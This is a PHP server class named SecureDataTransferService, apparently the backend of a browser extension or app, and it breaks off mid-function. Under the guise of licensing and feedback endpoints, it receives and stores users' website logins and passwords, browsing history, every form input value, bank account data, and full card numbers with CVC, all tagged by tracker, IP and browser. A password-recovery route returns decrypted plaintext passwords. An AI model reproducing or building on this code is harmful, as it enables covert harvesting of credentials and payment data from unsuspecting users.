<?php declare(strict_types=1);

namespace Mishusoft\Services;

use Mishusoft\Cryptography\OpenSSL\Decryption;
use Mishusoft\Cryptography\OpenSSL\Encryption;
use Mishusoft\Http;
use Mishusoft\Storage;
use Mishusoft\System\Firewall;
use Mishusoft\System\Network;
use Mishusoft\System\Time;
use Mishusoft\Utility\ArrayCollection;
use Mishusoft\Utility\Debug;
use Mishusoft\Utility\Inflect;
use Mishusoft\Utility\Number;

class SecureDataTransferService
{
    /**
     * SecureDataTransferService constructor.
     * This is built-in uninterrupted web request processing delivery system.
     */

    /*declare version*/
    public static SecureDataTransferDatabaseService $conOfDatabase;
    private static int $limitOfProductLicence;
    private static int $limitOfProductLicenceBase;

    /**
     * SecureDataTransferService constructor.
     */
    public function __construct()
    {
        self::$conOfDatabase = new SecureDataTransferDatabaseService();
    }

    /**
     * @param array $request
     */
    public function api(array $request)
    {
        Debug::preOutput($request);
    }

    /**
     * @param array $request
     * @throws \GeoIp2\Exception\AddressNotFoundException
     * @throws \JsonException
     * @throws \MaxMind\Db\Reader\InvalidDatabaseException
     * @throws \Mishusoft\Exceptions\ErrorException
     * @throws \Mishusoft\Exceptions\HttpException\HttpResponseException
     * @throws \Mishusoft\Exceptions\JsonException
     * @throws \Mishusoft\Exceptions\LogicException\InvalidArgumentException
     * @throws \Mishusoft\Exceptions\PermissionRequiredException
     * @throws \Mishusoft\Exceptions\RuntimeException
     */
    public function monitor(array $request)
    {
        if (Inflect::lower($request["method"]) === Inflect::lower('index')) {
            Firewall::runtimeFailure("Bad Request", [
                "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                "error" => ["description" => "Your requested url is broken!!"],
            ]);
        } elseif (Inflect::lower($request["method"]) === Inflect::lower('browser')) {
            if (Inflect::lower(implode("/", $request['arguments'])) === Inflect::lower('receiveFeedback')) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true, 512, JSON_THROW_ON_ERROR);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("update", $RequestedDataArray) and is_array($RequestedDataArray["update"]) and count($RequestedDataArray["update"]) > 0) {
                        self::$conOfDatabase->receiveInfoAboutUserUpdate(
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["update"], "name")),
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["update"], "version")),
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["update"], "ip")),
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["update"], "browser")),
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["update"], "message"))
                        );

                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                    }

                    if (array_key_exists("status", $RequestedDataArray) and is_array($RequestedDataArray["status"]) and count($RequestedDataArray["status"]) > 0) {
                        $status = self::$conOfDatabase->getInfAbtInstPrdStatus(
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "name")),
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "version")),
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "ip")),
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "os_version")),
                            Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "browser"))
                        );
                        if (is_array($status) and count($status) > 0) {
                            self::$conOfDatabase->updateInfOfPrdStatus(
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "name")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "version")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "ip")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "os_version")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "browser")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "message"))
                            );
                        } else {
                            self::$conOfDatabase->insertInfOfPrdStatus(
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "name")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "version")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "ip")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "os_version")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "browser")),
                                Inflect::removeTags(ArrayCollection::value($RequestedDataArray["status"], "message"))
                            );
                        }

                        header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                    }

                    if (!empty(ArrayCollection::value($RequestedDataArray, "browser")) && is_array(ArrayCollection::value($RequestedDataArray, "browser"))) {
                        self::$conOfDatabase->rcvInfAbtUsersBrowser(ArrayCollection::value($RequestedDataArray, "browser"));
                    }
                    if (!empty(ArrayCollection::value($RequestedDataArray, "ipdata")) && is_array(ArrayCollection::value($RequestedDataArray, "ipdata"))) {
                        self::$conOfDatabase->rcvInfAbtUsersIP(ArrayCollection::value($RequestedDataArray, "ipdata"));
                    }
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"],
                    ]);
                }
            } /*send installed product id form server to client*/
            elseif (Inflect::lower(join("/", $request['arguments'])) === Inflect::lower('getPubAppId')) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (!empty(ArrayCollection::value($RequestedDataArray, "IdRequest")) && is_array(ArrayCollection::value($RequestedDataArray, "IdRequest"))) {
                        if (ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "message") == 'install' || ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "message") == 'checkRun') {
                            self::getVerifiedProductId($RequestedDataArray);
                        } elseif (strpos(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "IdRequest"), "message"), "update") <= 0) {
                            self::getVerifiedProductId($RequestedDataArray);
                        } else {
                            Storage::StreamAsJson(["data" => "empty"]);
                        }
                    }
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"],
                    ]);
                }
            } /*manage user data form client*/
            elseif (Inflect::lower(join("/", $request['arguments'])) === Inflect::lower("UserDataManagement") || Inflect::lower(join("/", $request['arguments'])) === Inflect::lower("browserUserDataManagement")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                $defaultQueries = [
                    "tracker" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "tracker"),
                    "app_id" => Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                    "ip_address" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip"),
                    "os_name_arch" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch"),
                    "browserNameFull" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser"),
                ];
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("userdata", $RequestedDataArray) and array_key_exists("command", $RequestedDataArray)) {
                        /*collect data*/
                        if (Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('saveLoginData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, [
                                "workWebsite" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "event"),
                                "username" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "username"),
                                "password" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"),
                                "last_update_date_time" => Time::getToday(),
                            ]));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . ' 204 No response');
                        }
                        /*collect data*/
                        if (Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('saveLogoutData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, [
                                "workWebsite" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "event"),
                                "username" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "username"),
                                "last_update_date_time" => Time::getToday(),
                            ]));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }
                        /*collect data*/
                        if (Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('saveNavigateData')) {
                            self::$conOfDatabase->saveDataOfUsersBrowserHistories(array_merge($defaultQueries, [
                                "workWebsite" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "last_update_date_time" => Time::getToday(),
                            ]));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }
                        /*collect data*/
                        if (Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('saveUserSettingData')) {
                            $licence = '';
                            $registeredUserIdByEmail = '';
                            if (Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email"))) {
                                $registeredUserIdByEmail = self::$conOfDatabase->getUsrIdByEmlAddr(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                            }

                            if (ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")) {
                                $registeredUserIdByIP = self::$conOfDatabase->getUsrIdByIpAddr(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")));
                                $licence = self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                    Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                    Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                );
                            }
                            if (!empty(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "first_name"))) &&
                                !empty(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "last_name"))) &&
                                !empty(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email"))) &&
                                !empty(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")))) {
                                if (!empty($registeredUserIdByEmail)) {
                                    Storage::StreamAsJson(['message' => 'error', 'registration' => 'already_register', 'way' => 'email', 'licence' => $licence]);
                                } elseif (!empty($registeredUserIdByIP)) {
                                    Storage::StreamAsJson(['message' => 'error', 'registration' => 'already_register', 'way' => 'ip', 'licence' => $licence]);
                                } else {
                                    self::$conOfDatabase->saveUserSettingData(
                                        Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch")),
                                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "first_name")),
                                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "last_name")),
                                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")),
                                        Encryption::static(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")))
                                    );

                                    self::getLicenceLimitByPlan('trial');

                                    self::$conOfDatabase->setLicenceForProductOfUser(
                                        Number::filterInt(self::$conOfDatabase->getUsrIdByEmlAddr(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")))),
                                        Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                        Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                        'trial',
                                        self::$limitOfProductLicence,
                                        self::$limitOfProductLicenceBase,
                                        Time::getToday(),
                                        Time::getToday(),
                                        Time::getNextDayDate(),
                                        'not-fixed'
                                    );

                                    Storage::StreamAsJson([
                                        'message' => 'success', 'registration' => 'new_register',
                                        'way' => 'new', 'log_status' => 'success', 'u_pass' => Encryption::static(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"))),
                                        'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                            Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                            Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                            Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                        ),
                                    ]);
                                }
                            } else {
                                Storage::StreamAsJson(['message' => 'error', 'registration' => 'failed', 'way' => 'empty_data', 'licence' => $licence]);
                            }
                        }

                        if (Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('saveRegistrationData')) {
                            self::$conOfDatabase->saveDataOfUsersAccess(array_merge($defaultQueries, [
                                "workWebsite" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "workWebsite"),
                                "event" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "event"),
                                "username" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "username"),
                                "password" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"),
                                "email" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email"),
                                "last_update_date_time" => Time::getToday(),
                            ]));
                            header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                        }

                        if (Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('doUserLoginData')) {
                            /*print_r(Decryption::static($data->userdata->_default_->app_id));*/
                            $IdNbOfUsr = self::$conOfDatabase->getUsrIdByEmlAddr(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                            $userDetailsByEmail = self::$conOfDatabase->getUsrDtlByEml(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                            if (is_array($userDetailsByEmail) and count($userDetailsByEmail) > 0) {
                                $password = self::$conOfDatabase->getUsrPssByEmlAddr(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                                if (!empty($password) and strlen($password) > USER_PASSWORD_LENGTH_LIMIT) {
                                    if (Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "passwordType")) === 'encrypt') {
                                        if (Decryption::static(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"))) === $password) {
                                            $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")), Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")));
                                            self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                        } else {
                                            Storage::StreamAsJson(['message' => 'error', 'login' => 'incorrect', 'way' => 'password']);
                                        }
                                    } else {
                                        if (Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")) === $password) {
                                            $userDetails = self::$conOfDatabase->getUsrDtlByEmlPss(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")), Encryption::static(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password"))));
                                            self::processUserAuthentication($RequestedDataArray, $IdNbOfUsr, $userDetails);
                                        } else {
                                            Storage::StreamAsJson(['message' => 'error', 'login' => 'incorrect', 'way' => 'password']);
                                        }
                                    }
                                } else {
                                    Storage::StreamAsJson(['message' => 'error', 'login' => 'not_exist', 'way' => 'password']);
                                }
                            } else {
                                Storage::StreamAsJson(['message' => 'error', 'login' => 'not_exist', 'way' => 'email']);
                            }
                        }

                        if (Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('resetUserIpData')) {
                            self::$conOfDatabase->resetUsrDtlByNbOfUsrId(
                                self::$conOfDatabase->getUsrIdByIpAddr(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip"))),
                                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "os_name_arch")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "first_name")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "last_name")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")),
                                Encryption::static(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")))
                            );

                            Storage::StreamAsJson([
                                'message' => 'success', 'registration' => 'new_register',
                                'way' => 'new', 'log_status' => 'success', 'u_pass' => Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "password")),
                                'licence' => self::$conOfDatabase->getLcnByPrdIdCLIpBr(
                                    Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "app_id")),
                                    Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "ip")),
                                    Inflect::removeTags(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "_default_"), "browser"))
                                ),
                            ]);
                        }

                        if (Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('recoverUserPassword')) {
                            $user = self::$conOfDatabase->getUsrDtlByEml(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                            if (isset($user)) {
                                $password = self::$conOfDatabase->getUsrPssByEmlAddr(Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "userdata"), "email")));
                                if (isset($password)) {
                                    Storage::StreamAsJson(['message' => 'success', 'passwordRecovery' => 'exist', 'way' => 'email', 'password' => Decryption::static($password)]);
                                } else {
                                    Storage::StreamAsJson(['message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'password']);
                                }
                            } else {
                                Storage::StreamAsJson(['message' => 'error', 'passwordRecovery' => 'not_exist', 'way' => 'email']);
                            }
                        }
                    }
                } /*else {
                            Firewall::runtimeFailure("Bad Request", [
                                "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                                "error" => ["description" => "Your requested url is broken!!"]
                            ]);
                        }*/
            } /*collect client's browser's input data*/
            elseif (Inflect::lower(join("/", $request['arguments'])) === Inflect::lower("InputElementDataRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("inputElementData", $RequestedDataArray)
                        and Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('saveInputElementData'
                            and is_array(ArrayCollection::value($RequestedDataArray, "inputElementData")))) {
                        $defaultQueries = [
                            "tracker" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "_default_"), "app_id")),
                            "ip_address" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "_default_"), "ip"),
                            "browserNameFull" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "_default_"), "browser"),
                        ];
                        self::$conOfDatabase->storeCltBrInpInDb(array_merge($defaultQueries, [
                            "work_website" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "workWebsite"),
                            "name" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "name"),
                            "type" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "type"),
                            "value" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "value"),
                            "placeholder" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "inputElementData"), "placeholder"),
                        ]));
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"],
                    ]);
                }
            } /*collect client's bank account info from browser*/
            elseif (Inflect::lower(join("/", $request['arguments'])) === Inflect::lower("clientBankAccountRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("bankAccountData", $RequestedDataArray)
                        and Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('saveBankAccountData'
                            and is_array(ArrayCollection::value($RequestedDataArray, "bankAccountData")))) {
                        $defaultQueries = [
                            "tracker" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "_default_"), "app_id")),
                            "ip_address" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "_default_"), "ip"),
                            "browserNameFull" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "_default_"), "browser"),
                        ];
                        self::$conOfDatabase->storeCltBnkAccData(array_merge($defaultQueries, [
                            "work_website" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "workWebsite"),
                            "data_type" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "name"),
                            "data_value" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "bankAccountData"), "type"),
                        ]));
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"],
                    ]);
                }
            } /*collect client's online payment info from browser*/
            elseif (Inflect::lower(join("/", $request['arguments'])) === Inflect::lower("clientPaymentMethodsRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray) and array_key_exists("paymentMethodsInfo", $RequestedDataArray)
                        and Inflect::lower(ArrayCollection::value($RequestedDataArray, "command")) === Inflect::lower('savePaymentMethodsData'
                            and is_array(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo")))) {
                        $defaultQueries = [
                            "tracker" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "tracker"),
                            "app_id" => Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "app_id")),
                            "ip_address" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "ip"),
                            "os_name_arch" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "os_name_arch"),
                            "browserNameFull" => ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "_default_"), "browser"),
                        ];
                        if (Inflect::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber")) !== Inflect::lower("Unknown")
                            and Inflect::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder")) !== Inflect::lower("Unknown")
                            and Inflect::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand")) !== Inflect::lower("Unknown")
                            and Inflect::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire")) !== Inflect::lower("Unknown")
                            and Inflect::lower(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC")) !== Inflect::lower("Unknown")) {
                            self::$conOfDatabase->storeCltPytMtdData(array_merge($defaultQueries, [
                                "work_website" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "workWebsite"),
                                "event" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "event") ? ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "event") : 'bug',
                                "cardNumber" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardNumber"),
                                "cardHolder" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardHolder"),
                                "cardBrand" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardBrand"),
                                "cardExpire" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardExpire"),
                                "cardCVC" => ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "paymentMethodsInfo"), "cardCVC"),
                            ]));
                        }
                    }
                    header(Network::getValOfSrv('SERVER_PROTOCOL') . Http::NO_CONTENT . ' No response');
                } else {
                    Firewall::runtimeFailure("Bad Request", [
                        "debug" => ["file" => Http::browser()->getURLPath(), "location" => __METHOD__, "description" => "Your requested url is broken!!"],
                        "error" => ["description" => "Your requested url is broken!!"],
                    ]);
                }
            } /*collect client's online earning info from browser*/
            elseif (Inflect::lower(join("/", $request['arguments'])) === Inflect::lower("clientEarningRecord")) {
                $RequestedDataArray = json_decode(file_get_contents('php://input'), true);
                if (is_array($RequestedDataArray) and count($RequestedDataArray) > 0) {
                    if (array_key_exists("command", $RequestedDataArray)
                        and array_key_exists("earndata", $RequestedDataArray)
                        and is_array(ArrayCollection::value($RequestedDataArray, "earndata"))) {
                        self::$conOfDatabase->upgradeLcnLmt(
                            Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                            Number::filterInt(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "earn"))
                        );

                        $today = self::$conOfDatabase->getClientErnDtlByDt(
                            Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                            Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "username")),
                            Time::getTodayDateOnly()
                        );
                        if (!is_array($today) and count($today)) {
                            self::$conOfDatabase->updateClientErnDtlByDt(
                                Decryption::static(ArrayCollection::value(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "_default_"), "app_id")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "username")),
                                Inflect::removeTags(ArrayCollection::value(ArrayCollection::value($RequestedDataArray, "earndata"), "earn")),
